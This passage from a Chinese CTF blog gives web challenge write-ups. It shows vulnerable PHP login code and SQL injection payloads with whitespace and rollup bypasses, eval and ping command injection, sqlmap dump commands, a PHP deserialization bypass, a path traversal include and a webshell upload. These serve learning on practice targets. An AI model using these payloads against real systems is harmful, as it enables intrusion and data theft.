class="number">8</span>       <span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);  </span><br><span class="line"><span class="number">9</span>              <span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123; </span><br><span class="line"><span class="number">10</span>                      <span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123; </span><br><span class="line"><span class="number">11</span>                        <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="number">12</span>                        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line"><span class="number">13</span>        &#125; </span><br><span class="line"><span class="number">14</span>           &#125; </span><br><span class="line"><span class="number">15</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这一行<br>$sql=”select * from user where username =’admin’ and password=’”.md5($password,true).”‘“;<br>对于函数md5(string,raw)<br>第二个参数有以下可选项：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数<br>所以只要md5加密后的16进制转化为二进制时有 ‘or’xxxx，即可构成闭合语句： username =’admin’ and password =‘ ’or ‘xxxxx’ 成功登陆<br>这里给出两个符合的字符串(参考羽师傅blog）<br>ffifdyop<br>129581926211651571912466741651878684928<br>但题目有长度限制，所以输入ffifdyop即可获取flag</p>
-<p>web10<img src="https://img-blog.csdnimg.cn/20210310210313122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开页面点击取消按钮，自动下载了index.phps文件，查看源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> preg_replace(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>)!=strlen(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)!=strlen(replaceSpecialChar(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆ</span></span><br><span class="line"><span class="string">							</span></span><br></pre></td></tr></table></figure>
-<p>介绍一下两个sql语句：<br>1.group by：对进行查询的结果进行分组。group by后跟什么，就按什么分组<br>2.with rollup：group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计。<br>过滤空格的话用/<strong>/进行绕过就行<br>pyload: admin’/</strong>/or/<strong>/1=1/</strong>/group/<strong>/by/</strong>/password/<strong>/with/</strong>/rollup/**/#<br>在用户名框里输入这个，密码框里为空即可。因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[‘password’]<br>得到flag</p>
-<p>web11<br><img src="https://img-blog.csdnimg.cn/20210310210705549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这一行 if($password==$_SESSION[‘password’])<br>让输入框的内容 等于 session 的值就好了<br>打开F12，找到存储，删除里面的phpsessionid<img src="https://img-blog.csdnimg.cn/20210310210806333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>session的值就是空了，那么我们再提交空密码，就会相等了，得到flag</p>
-<p>web12<br><img src="https://img-blog.csdnimg.cn/20210310210852718.png" alt="在这里插入图片描述"><br>打开网站没有发现可用的注入点，应该不是sql注入了，直接看源码，发现提示?cmd=。<br>输入?cmd=phpinfo();有回显。<br>eval执行漏洞中我们可以查看网页的源代码，我们输入?cmd=highlight_file(“index.php”);<br>成功显示网站源码<img src="https://img-blog.csdnimg.cn/20210310211042237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>介绍一个php的函数glob();<br>glob() 函数返回匹配指定模式的文件名或目录。<br>glob(“<em>“) 匹配任意文件<br>glob(“</em>.txt”)匹配以txt为后缀的文件<br>有了这个方法我们先把当前目录下所有的文件找出来看看有没有可用的。输入?cmd=print_r(glob(“*”));打印出了如下文件<br><img src="https://img-blog.csdnimg.cn/20210310211132719.png" alt="在这里插入图片描述"><br>flag就在那个很长名字的php文件中，使用highlight_file()函数成功输出该php文件中的源码<img src="https://img-blog.csdnimg.cn/20210310211242406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yun421">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yun421">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">攻防世界新手区题解</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-04 14:52:33" itemprop="dateCreated datePublished" datetime="2021-03-04T14:52:33+08:00">2021-03-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-15 17:13:18" itemprop="dateModified" datetime="2021-10-15T17:13:18+08:00">2021-10-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1.view_source：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br> 本题打开网页查看源代码即得到flag<br> 2.robots：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。<br> 本题看提示robots协议，就在地址栏后面跟上robots.txt，<img src="https://img-blog.csdnimg.cn/2020121520061913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 可以看到第三行，即地址栏修改为f1ag_1s_h3re.php，<img src="https://img-blog.csdnimg.cn/20201215200757492.png" alt="在这里插入图片描述"><br>3.backup:X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！<br>本题需要知道备份文件的后缀名，常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history，尝试后发现为bak，故地址栏修改为index.php.bak<img src="https://img-blog.csdnimg.cn/20201215201219732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.cookie:X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’<br>本题需要查看cookie，F12查看源代码，选择cookie栏<img src="https://img-blog.csdnimg.cn/20201215201950773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.disabled_button：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？<br>本题只要想办法让按钮可以按即可，查看源代码发现这一条，将其删除，按钮可以按下<br><img src="https://img-blog.csdnimg.cn/20201215202420114.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201215202546626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.weak_auth：小宁写了一个登陆验证页面，随手就设了一个密码。<br><img src="https://img-blog.csdnimg.cn/2020121520265144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便输入登录提示使用admin用户名，然后网页地址到了check.php<br><img src="https://img-blog.csdnimg.cn/20201215202759581.png" alt="在这里插入图片描述"><br>用burp抓包，send to Intruder，在Positions中先clear§，再在password的值左右Add§<br><img src="https://img-blog.csdnimg.cn/20201215205159138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>选择payloads选项，载入字典进行爆破，查看返回结果可知密码<br>7.simple_php：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。<br><img src="https://img-blog.csdnimg.cn/20201215205613779.png" alt="在这里插入图片描述"><br>进行php代码审计，php中有两种比较符号，=== 会同时比较字符串的值和类型，== 会先将字符串换成相同类型，再作比较，属于弱类型比较<br>当同时满足a==0和a时输出flag1<img src="https://img-blog.csdnimg.cn/20201215210046824.png" alt="在这里插入图片描述"><br>== 是不严格的比较,会先进行类型转换再比较 ,查看php类型比较表<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a><br>发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的形式<br>ps：数字和字符混合的字符串转换为整数后只保留数字！<br>is_numeric() 函数用于检测类型是否为数字或数字字符串<img src="https://img-blog.csdnimg.cn/20201215210538673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>8.get_post：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？<br>GET - 从指定的资源请求数据<br>POST - 向指定的资源提交要被处理的数据<br>在地址后加？分隔，a=1；用hackbar插件post data传b=2<img src="https://img-blog.csdnimg.cn/20201215211106145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9.xff_referer：X老师告诉小宁其实xff和referer是可以伪造的。<br>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的<br>用burp抓包，先xff，后发现需要referer<br>10.webshell：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。<br>一句话木马，通过蚁剑连接，发现一个flag.txt文件<img src="https://img-blog.csdnimg.cn/20201215215207985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>11.command_execution:小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。<br>在文本框中写127.0.0.1 | find / -name “flag.txt” <img src="https://img-blog.csdnimg.cn/2020121521560195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到目录下的flag文件，打开<br><img src="https://img-blog.csdnimg.cn/20201215215709330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>12.simple_js：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )<br>输入任何密码都错误，源代码中<img src="https://img-blog.csdnimg.cn/20201215220114458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>应该是base16，写脚本<br><img src="https://img-blog.csdnimg.cn/20201215220342689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yun421">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yun421">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">攻防世界高手区题解</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-04 14:41:51" itemprop="dateCreated datePublished" datetime="2021-03-04T14:41:51+08:00">2021-03-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-15 17:13:00" itemprop="dateModified" datetime="2021-10-15T17:13:00+08:00">2021-10-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1.</p>
-<p>   <img src="https://img-blog.csdnimg.cn/20201216202314127.png" alt="在这里插入图片描述"><br>   <img src="https://img-blog.csdnimg.cn/20201216202337147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>index.php还是跳回1.php，但是已经可以看到flag<br><img src="https://img-blog.csdnimg.cn/20201216202453186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.Training-WWW-Robots<img src="https://img-blog.csdnimg.cn/20201216202806313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>3.php_rce<img src="https://img-blog.csdnimg.cn/20201216205729539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020121620580899.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216205859471.png" alt="在这里插入图片描述"><br>ThinkPHP 5.x远程命令执行漏洞分析与复现<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a><br>目前我还看不懂（继续努力）<br>4.Web_php_include<img src="https://img-blog.csdnimg.cn/20201216211220420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>学到了很多，对一个参数的命令来显示文件包含<br><img src="https://img-blog.csdnimg.cn/20201216211328780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再用命令用参数显示含有flag的php</p>
-<p>5.<br>.<img src="https://img-blog.csdnimg.cn/20201216211622816.png" alt="在这里插入图片描述"><br>这个题是sql注入，尝试输入一些值后没有头绪，看了WP也有点懵，就把WP放这以后再悟<br><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/writeup?type=web&amp;id=5417&amp;number=3&amp;grade=1&amp;page=undefined">https://adworld.xctf.org.cn/task/writeup?type=web&amp;id=5417&amp;number=3&amp;grade=1&amp;page=undefined</a></p>
-<p>6.<img src="https://img-blog.csdnimg.cn/20201216212358878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216213857561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先点击各个选项测试，发现只有报表中心可点，此时url中有id=1字样，故使用burp爆破攻击后查看响应包，发现id为2333时，响应包长度不同，可获取flag</p>
-<p>7.warmup<img src="https://img-blog.csdnimg.cn/20201216214753916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020121621481232.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216214835345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216214850480.png" alt="在这里插入图片描述"><br>第二个红框中内容截取有问题，构造payload:file=source.php%253f/../../../../../ffffllllaaaagggg（这句是WP，我不太懂）<br><img src="https://img-blog.csdnimg.cn/2020121621492750.png" alt="在这里插入图片描述"><br>8.NewsCenter<br><img src="https://img-blog.csdnimg.cn/20210302161442784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到该题有一个输入框，尝试用sqlmap解决<br>1.获取注入点<br>sqlmap -u <a target="_blank" rel="noopener" href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df”</p>
-<p>2.获取数据库信息<br>sqlmap -u <a target="_blank" rel="noopener" href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -dbs<br><img src="https://img-blog.csdnimg.cn/20210302161929814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>3.获取库内表信息<br>sqlmap -u <a target="_blank" rel="noopener" href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -D news –tables<br><img src="https://img-blog.csdnimg.cn/20210302161958761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>4.获取表内字段信息<br>sqlmap -u <a target="_blank" rel="noopener" href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -D news -T secret_table –columns<br><img src="https://img-blog.csdnimg.cn/20210302162021998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>5.获取字段内容，得到flag<br>sqlmap -u <a target="_blank" rel="noopener" href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -D news -T secret_table -C “fl4g” –dump<br><img src="https://img-blog.csdnimg.cn/20210302162052460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9.NaNNaNNaNNaN-Batman<br>题目下载一个名为web100的附件，用firefox打开出现一个文本框，查看html代码发现eval函数，将它改为alert得到真正的源代码：<br><img src="https://img-blog.csdnimg.cn/20210302164733104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>共有5个if,第一个要求值的长度为16,将下面字符拼接得到be0f233ac7be98aa,输入提交得到flag</p>
-<p>10.web2<br><img src="https://img-blog.csdnimg.cn/20210302165329534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>很明确，写下脚本：<br><img src="https://img-blog.csdnimg.cn/20210302170058635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>strrev(string): 反转字符串<br>ord(string): 返回字符串首个字符的 ASCII 值<br>chr(): 从指定的 ASCII 值返回对应的字符</p>
-<p>11.PHP2<br><img src="https://img-blog.csdnimg.cn/20210302171551169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70"><br>url 解码是% + ascii 的十六进制，GET本来会进行一次url转码，urldecode又进行一次，即经过两次url转码得到id=%2561%2564%256d%2569%256e，在线url解码网站<a target="_blank" rel="noopener" href="http://www.jsons.cn/urlcode/">http://www.jsons.cn/urlcode/</a></p>
-<p>12.unserialize3<br><img src="https://img-blog.csdnimg.cn/20210302173801360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>public属性序列化后格式为：数据类型:属性名长度:”属性名”;数据类型:属性值长度:”属性值”<br>O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}，设置属性值为2，可导致反序列化异常，即O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}，构造payload=?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}得到flag<br>PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。<br>当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()</p>
-<p>13.upload1<br><img src="https://img-blog.csdnimg.cn/20210302174508880.png" alt="在这里插入图片描述"><br>这是web中的文件上传，尝试过后发现要求上传图片，故将一句话木马编辑完将文件类型改为jpg或png，然后用burp抓包修改文件名后缀为php，用蚁剑连接找到flag.php</p>
-<p>20.mfw<br><img src="https://img-blog.csdnimg.cn/20210303091943745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在about中看到git，访问.git<br><img src="https://img-blog.csdnimg.cn/20210303092127480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到index文件，下载打开出现乱码，用githack工具<br><img src="https://img-blog.csdnimg.cn/20210303092310399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载后打开index.php看到源代码<br><img 